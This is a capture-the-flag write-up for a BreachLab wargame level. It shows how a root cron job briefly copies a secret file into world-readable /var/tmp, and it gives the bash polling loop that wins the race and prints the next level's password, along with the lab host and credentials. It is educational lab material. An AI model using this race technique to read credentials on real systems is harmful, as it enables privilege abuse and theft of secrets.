# BreachLab - Ghost Track: Level 20 → 21 (Cron Discovery & Ephemeral File Interception)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Ghost Track
- **Level:** Level 20 → 21 (Cron Discovery)
- **Host:** `204.168.229.209`
- **Port:** `2222`
- **Current User:** `ghost20`
- **Goal:** Retrieve the password / credentials for `ghost21`
- **Next Connection:** `ssh ghost21@204.168.229.209 -p 2222`

---

## 1. Scenario & Objectives

The MOTD banner outlines the scheduled task exploration objective:
> *"Something runs on a schedule as root. Find what. Find where it writes. Find what it reads. Scheduled tasks live in specific corners of /etc."*

The goal is to inspect system crontabs under `/etc/cron*`, discover active scheduled tasks executed by `root`, analyze their operational script behavior, and intercept the credential written temporarily to the filesystem before cleanup.

---

## 2. Reconnaissance & Crontab Enumeration

Logging in via SSH as `ghost20` and inspecting standard cron directories:

```bash
ghost20@breachlab:~$ ls -la /etc/cron.d/
total 32
drwxr-xr-x 1 root root 4096 May 19 12:05 .
drwxr-xr-x 1 root root 4096 May 19 12:05 ..
-rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
-rw-r--r-- 1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r-- 1 root root   38 May 31 22:18 ghost-level20
-rw-r--r-- 1 root root   50 May 31 22:18 ghost-residue-cleanup
```

### Inspecting `/etc/cron.d/ghost-level20`

```bash
ghost20@breachlab:~$ cat /etc/cron.d/ghost-level20
* * * * * root /opt/ghost-cron/job.sh
```

A root-privileged cron job runs every minute (`* * * * *`) executing `/opt/ghost-cron/job.sh`.

---

## 3. Script Analysis & Ephemeral File Exposure

Inspecting the target script `/opt/ghost-cron/job.sh`:

```bash
ghost20@breachlab:~$ cat /opt/ghost-cron/job.sh
#!/bin/bash
cat /etc/ghost-cron-secret > /var/tmp/ghost-cron-output 2>/dev/null
sleep 2
rm -f /var/tmp/ghost-cron-output
```

### Vulnerability Mechanism
1. Every minute, the root process reads `/etc/ghost-cron-secret` (inaccessible to unprivileged users directly) and redirects the output into `/var/tmp/ghost-cron-output`.
2. The file is left on disk in world-readable temporary storage for exactly 2 seconds (`sleep 2`).
3. The process deletes `/var/tmp/ghost-cron-output`.

---

## 4. Real-Time File Polling & Flag Extraction

Because the file only exists for a 2-second time window every minute, we execute an active polling loop in Bash to monitor the path and read the secret the moment it gets created:

```bash
ghost20@breachlab:~$ while true; do cat /var/tmp/ghost-cron-output 2>/dev/null && break; done
Cr0n_R34ds
```

### Technical Breakdown of the Polling Loop

1. **`while true; do ... done`:** Infinite loop continuously checking the path thousands of times per second.
2. **`cat /var/tmp/ghost-cron-output`:** Attempts to read and print the target file content.
3. **`2>/dev/null`:** Redirects standard error (`stderr`) to silence missing file errors while the file is absent.
4. **`&& break`:** Short-circuit evaluation — only executes `break` when `cat` completes with exit status `0` (success), capturing the flag immediately upon file creation and returning terminal control.

---

## 5. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Next User** | `ghost21` |
| **Password / Flag** | `Cr0n_R34ds` |
| **Scheduled Job** | `/etc/cron.d/ghost-level20` |
| **Script Path** | `/opt/ghost-cron/job.sh` |
| **Temporary File** | `/var/tmp/ghost-cron-output` |
| **Target SSH Command** | `ssh ghost21@204.168.229.209 -p 2222` |

---

## 6. Key Commands & Concepts Reference

- `/etc/crontab` & `/etc/cron.d/*`: System-wide and package-specific crontab definitions specifying user context and scheduling.
- `while true; do cat <file> 2>/dev/null && break; done`: High-frequency polling loop for capturing transient files in race conditions or short-lived cron jobs.
- `inotifywait -m /var/tmp -e create`: (Alternative) Kernel inotify watcher tool for tracking file creation events in directories.

---

## 7. Lessons Learned

1. **Insecure Temporary File Generation:** Writing sensitive data to shared temporary directories (`/tmp`, `/var/tmp`) without restrictive umasks (`077`) or secure file descriptors exposes credentials to local unprivileged users.
2. **Time-of-Check to Time-of-Use (TOCTOU) & Race Windows:** Even brief windows where sensitive data resides on disk can be trivially captured using simple automated polling loops.
